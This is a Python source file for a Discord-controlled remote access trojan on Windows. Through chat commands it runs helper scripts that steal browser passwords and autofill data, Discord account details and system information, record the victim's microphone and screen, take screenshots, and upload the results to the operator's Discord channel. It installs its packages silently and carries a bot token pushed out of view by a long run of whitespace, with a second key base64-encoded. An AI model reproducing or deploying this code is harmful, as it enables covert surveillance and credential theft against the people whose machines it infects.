import os
import re
import uuid
import time
import base64
import subprocess

bin_folder = f"C:/Users/{os.getlogin()}/bin"

with open(f"{bin_folder}/comm.txt", "r") as f:
    prefixe = f.read()

def install_package(package_name):
    result = subprocess.run([prefixe, "-m", "pip", "install", package_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Install modules
packages = [
    "pywin32",
    "pyautogui",
    "requests",
    "pyaudio",
    "discord.py",
    "pycryptodome",
    "opencv-python",
    "numpy"
]

for package in packages:
    install_package(package)

import discord

def get_mac():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
    cleaned_mac = re.sub(r'[^a-z0-9-]', '-', mac.lower())
    return cleaned_mac

sec = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1_"                                                                                                                                                                                                                                                                                                  ; key = base64.b64decode('TVRJNU1qVXhPRE15TXpjeU16azJNRE0zTWcuRzNkSVBBLnJQUUxQSTRYVGhIUzVuZmxWN05BMXdSZE9rdjV4UXBNeDBFaldJ').decode('utf-8')
class Client(discord.Client):
    @staticmethod
    async def on_ready():
        for guild in client.guilds:
            channel_name = f"{os.getlogin().lower()}-{get_mac()}"
            existing_channel = discord.utils.get(guild.text_channels, name=channel_name)

            if existing_channel is None:
                new_channel = await guild.create_text_channel(channel_name)
                await new_channel.send(f':wireless:  `{os.getlogin()}` Connected')
            else:
                await existing_channel.send(f':wireless:  `{os.getlogin()}` Connected')

    async def on_message(self, message):
        channel_name = f"{os.getlogin().lower()}-{get_mac()}"
        if message.author == self.user:
            return

        channel = message.channel
        if channel.name == channel_name:
            # __________________________________________________________________________
            # *========================================================================*
            if message.content == '/wake':
                await message.channel.send(f':wireless:  `{os.getlogin()}` Connected')

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/help':
                await message.channel.send(f'**Commands List**\n'
                                           f'- `/wake` : Sends a message if the target is connected, otherwise nothing\n'
                                           f'- `/clear` : Clear anything in this channel\n'
                                           f'- `/grab <what-to-grab>` : Grab something on the target (use `/grab help` for help)\n'
                                           f'- `/record <what-to-record>` : Record something on the target (use `/record help` for help)\n'
                                           f'- `/screenshot` : Take a screenshot\n')

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/clear':
                await message.channel.purge()

            # __________________________________________________________________________
            # _____________________________COMPONENT HELP_______________________________
            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab help':
                await message.channel.send(f"**Component __grab__** :\n"
                                           f"- `/grab infos` : Grab all information about the target\n"
                                           f"- `/grab discord` : Grab the target's Discord account information\n"
                                           f"- `/grab browser` : Grab the target browser information (passwords, autofill fields, ...)\n")

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/record help':
                await message.channel.send(f"**Component __record__** :\n"
                                           f"- `/record screen` : Record the target's screen for 10s\n"
                                           f"- `/record voice` : Record the target's voice for 10s\n")

            # __________________________________________________________________________
            # ___________________________________GRAB___________________________________
            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab infos':
                if os.path.exists(f"{bin_folder}/computer.pyw"):
                    subprocess.run([prefixe, f"{bin_folder}/computer.pyw"])
                    for i in range(10):
                        if os.path.exists(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"):
                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                            await message.channel.send(file=discord.File(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"))
                            time.sleep(0.5)
                            os.remove(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt")
                            break
                        else:
                            time.sleep(1)
                else:
                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/computer.pyw`")

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab discord':
                if os.path.exists(f"{bin_folder}/disc.pyw"):
                    subprocess.run([prefixe, f"{bin_folder}/disc.pyw"])
                    for i in range(10):
                        if os.path.exists(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"):
                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                            await message.channel.send(file=discord.File(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"))
                            time.sleep(0.5)
                            os.remove(f"{bin_folder}/DISCORD-{os.getlogin()}.txt")
                            break
                        else:
                            time.sleep(1)
                else:
                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/disc.pyw`")

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab browser':
                if os.path.exists(f"{bin_folder}/password.pyw"):
                    subprocess.run([prefixe, f"{bin_folder}/password.pyw"])
                    for i in range(10):
                        if os.path.exists(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"):
                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                            await message.channel.send(file=discord.File(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"))
                            time.sleep(0.5)
                            os.remove(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt")
                            break
                        else:
                            time.sleep(1)
                else:
                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/password.pyw`")

            # __________________________________________________________________________
            # _________________________________RECORD___________________________________
            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/record voice':
                if os.path.exists(f"{bin_folder}/record.pyw"):
                    await message.channel.send(f":gear: Recording, please wait 10s")
                    subprocess.run([prefixe, f"{bin_folder}/record.pyw", "voice"])
                    for i in range(10):
                        if os.path.exists(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"):
                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                            await message.channel.send(file=discord.File(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"))
                            time.sleep(0.5)
                            os.remove(f"{bin_folder}/RECORDED-{os.getlogin()}.wav")
                            break
                        else:
                            time.sleep(1)
                else:
                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/record.pyw`")

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/record screen':
                if os.path.exists(f"{bin_folder}/record.pyw"):
                    await message.channel.send(f":gear: Recording, please wait 10s")
                    subprocess.run([prefixe, f"{bin_folder}/record.pyw", "screen"])
                    for i in range(10):
                        if os.path.exists(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"):
                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                            await message.channel.send(file=discord.File(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"))
                            time.sleep(0.5)
                            os.remove(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi")
                            break
                        else:
                            time.sleep(1)
                else:
                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/record.pyw`")

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/screenshot':
                if os.path.exists(f"{bin_folder}/screen.pyw"):
                    subprocess.run([prefixe, f"{bin_folder}/screen.pyw", "screenshot"])
                    for i in range(10):
                        if os.path.exists(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"):
                            await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                            await message.channel.send(file=discord.File(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"))
                            time.sleep(0.5)
                            os.remove(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png")
                            break
                        else:
                            time.sleep(1)
                else:
                    await message.channel.send(f":file_folder: Missing file : `{bin_folder}/record.pyw`")


            # __________________________________________________________________________
            # *========================================================================*
            else:
                if message.content.startswith("/"):
                    await message.channel.send(":no_entry_sign: Unkown command, type `/help` for help")


intents = discord.Intents.default()
intents.message_content = True
client = Client(intents=intents)
client.run(key)